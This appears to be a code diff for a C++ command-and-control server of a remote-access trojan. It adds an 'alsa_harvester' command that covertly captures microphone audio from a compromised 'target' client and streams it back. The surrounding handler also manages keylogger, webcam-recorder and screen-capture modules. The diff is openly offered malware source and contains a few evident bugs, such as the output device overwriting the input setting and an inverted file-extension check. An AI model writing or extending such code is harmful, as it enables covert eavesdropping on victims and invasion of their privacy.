@@ -86,6 +86,8 @@ CommandHandler::CommandHandler(
     argument_list_.push_back(Argument(KB_LAYOUT_ARG, ARG_TYPE_STRING, "-l", "--layout"));
     argument_list_.push_back(Argument(CONVERT_ARG, ARG_TYPE_SET, "-c", "--convert"));
     argument_list_.push_back(Argument(FPS_ARG, ARG_TYPE_FLOAT, "-fps", "--frames-per-second"));
+    argument_list_.push_back(Argument(HW_IN_ARG, ARG_TYPE_STRING, "-hwi", "--hardware-input"));
+    argument_list_.push_back(Argument(HW_OUT_ARG, ARG_TYPE_STRING, "-hwo", "--hardware-output"));
 
     command_map_.emplace("help", Command(
         "Show this help message.\n\tFor specific command <command> -h/--help", 
@@ -159,6 +161,13 @@ CommandHandler::CommandHandler(
         &CommandHandler::screen_hunter,
         this,
         {HELP_ARG, REMOVE_ARG, FPS_ARG},
+        {INDEX_ARG}
+    ));
+    command_map_.emplace("a", Command(
+        "Start capturing audio from the target. You can run [aplay/arecord] -l to see available device. Default input and output device: hw:0,0\n\t-hwi <target_input_device>\n\t-hwo <local_output_device>\n\t-o <output.raw> If you want to save to the output\n\t-rm -i <client_index> to stop capturing",
+        &CommandHandler::alsa_harvester,
+        this,
+        {HELP_ARG, REMOVE_ARG, HW_IN_ARG, HW_OUT_ARG, OUT_ARG},
         {INDEX_ARG}
     ));
 }
@@ -446,10 +455,10 @@ void CommandHandler::list() {
                             *p_event_log_ << "\n__keylogger__";
                         } else if ((*it)->command_code_ == WEBCAM_RECORDER) {
                             *p_event_log_ << "\n__webcam_recorder__";
-                        } else if ((*it)->command_code_ == AUDIO_RECORDER) {
-                            *p_event_log_ << "\n__audio_recorder__";
+                        } else if ((*it)->command_code_ == ALSA_HARVESTER) {
+                            *p_event_log_ << "\n__alsa_harvester__";
                         } else if ((*it)->command_code_ == SCREEN_HUNTER) {
-                            *p_event_log_ << "\nscreen__recorder__";
+                            *p_event_log_ << "\n__screen_hunter__";
                         }
                     }
                 }
@@ -701,11 +710,71 @@ void CommandHandler::screen_hunter() {
             try {
                 std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
             } catch (const std::system_error& e) {
-                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::screen_hunter] Error creating thread for keylogger" << RESET_C2_FIFO;
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::screen_hunter] Error creating thread for screen hunter" << RESET_C2_FIFO;
                 erase_tunnel(p_tunnels_, client_index, SCREEN_HUNTER);
             }
         } else {
             *p_event_log_ << LOG_MUST << RED << "[CommandHandler::screen_hunter] Screen Hunter is already active for client " << client_index << RESET_C2_FIFO;
+        }
+    }
+}
+
+void CommandHandler::alsa_harvester() {
+     if (arg_map_.find(INDEX_ARG) == arg_map_.end()) {
+        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::alsa_harvester] Invalid usage. alsa_harvester -h/--help for usage" << RESET_C2_FIFO;
+        return;
+    }
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+    Tunnel* p_tunnel = get_tunnel(client_index, ALSA_HARVESTER);
+
+    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
+        if (p_tunnel != nullptr) {
+            uint64_t u = 1;
+            write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
+            send_client(SCREEN_HUNTER, 0, client_index);
+            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::alsa_harvester] alsa_harvester removed from client " << client_index << RESET_C2_FIFO;
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::alsa_harvester] alsa_harvester is not active for client " << client_index << RESET_C2_FIFO; 
+        }
+    } else {
+        if (p_tunnel == nullptr) {
+            ALSAHarvester* p_alsa_harvester = new ALSAHarvester();
+
+            std::string hw_in = "hw:0,0", hw_out = "hw:0,0";
+            if (arg_map_.find(HW_IN_ARG) != arg_map_.end()) {
+                hw_in = std::any_cast<std::string>(arg_map_[HW_IN_ARG]);
+            }
+            if (arg_map_.find(HW_OUT_ARG) != arg_map_.end()) {
+                hw_in = std::any_cast<std::string>(arg_map_[HW_OUT_ARG]);
+            }
+            p_alsa_harvester->set_hws(hw_in, hw_out);
+
+            std::string out_name = "";
+            if (arg_map_.find(OUT_ARG) != arg_map_.end()) {
+                out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
+
+                if (out_name.find_last_of('.') != std::string::npos || 
+                    out_name.substr(out_name.find_last_of('.') + 1) != "raw") {
+                    *p_event_log_ << LOG_MUST << RED << "[CommandHandler::alsa_harvester] Invalid file format. Only .raw format is supported." << RESET_C2_FIFO;
+                    return;
+                }
+            }
+            p_alsa_harvester->set_out(out_name);
+
+
+            Tunnel* tunnel = new Tunnel(client_index, ALSA_HARVESTER, p_alsa_harvester);
+            {
+                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+                p_tunnels_->emplace_back(tunnel);
+            }
+            try {
+                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, UDP_BASED).detach();
+            } catch (const std::system_error& e) {
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::alsa_harvester] Error creating thread for alsa harvester" << RESET_C2_FIFO;
+                erase_tunnel(p_tunnels_, client_index, ALSA_HARVESTER);
+            }
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::alsa_harvester] ALSA Harvester is already active for client " << client_index << RESET_C2_FIFO;
         }
     }
 }
